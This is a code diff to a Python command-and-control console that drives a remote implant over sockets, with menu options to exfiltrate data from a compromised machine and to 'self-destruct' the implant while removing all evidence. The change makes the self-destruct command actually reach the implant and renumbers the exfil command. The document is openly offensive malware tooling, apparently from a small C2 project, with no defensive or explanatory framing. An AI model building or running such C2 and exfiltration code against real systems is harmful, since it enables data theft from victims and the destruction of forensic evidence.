@@ -11,7 +11,6 @@ server_address = ('localhost', 9999)
 c2_socket.bind(server_address)
 
 colorama.init(autoreset=True)
-exit = False
 
 print('########################################################')
 print('##                                                    ##')
@@ -47,23 +46,20 @@ def send_implant(comm):
     implant_socket.sendall(str.encode(comm))
     implant_socket.close()
 
-while(not exit):
+while(True):
     print("Options:")
     print("1. Self-destruct (clears implant and removes all evidence)")
-    print("2. Hide")
-    print("3. Exfil")
-    print("4. Exit")
-    print(f"{Fore.GREEN}What would you like to do:")
+    print("2. Exfil")
+    print("3. Exit")
+    print(f"{Fore.CYAN}What would you like to do:")
     choice = input(">>")
     if choice == '1':
-        print("Self-destruct initiated")
-        print("Removing all evidence")
+        print(f"{Fore.RED}Self-destruct initiated")
+        send_implant('1')
+        print(f"{Fore.RED}Self-destruct complete")
+        exit()
 
     elif choice == '2':
-        print("Hiding")
-        print("Halting exfil and awaiting further commands")
-
-    elif choice == '3':
         print("Exfil initiated")
         
         #Listen for the Responses
@@ -71,7 +67,7 @@ while(not exit):
         exfil = True
         while(exfil == True):
             #Send command to exfiltrate
-            send_implant('3')
+            send_implant('2')
             #Recieve the exfil
             recieve_exfil()
             print("Press n to end: any other key to continue")
@@ -79,12 +75,10 @@ while(not exit):
             if(c == 'n'):
                 break
             
-        
-
-    elif choice == '4' or choice == 'q' or choice == 'exit' or choice == 'Exit' or choice == 'quit':
-        exit = True
+    elif choice == '3' or choice == 'q' or choice == 'exit' or choice == 'Exit' or choice == 'quit':
         print("Exiting the C2 instance")
-        print("Implant is still running - connect to it again later")
+        print("Implant is still running - Connect to it again later")
+        exit()
 
     else:
         print("Unrecognized input")
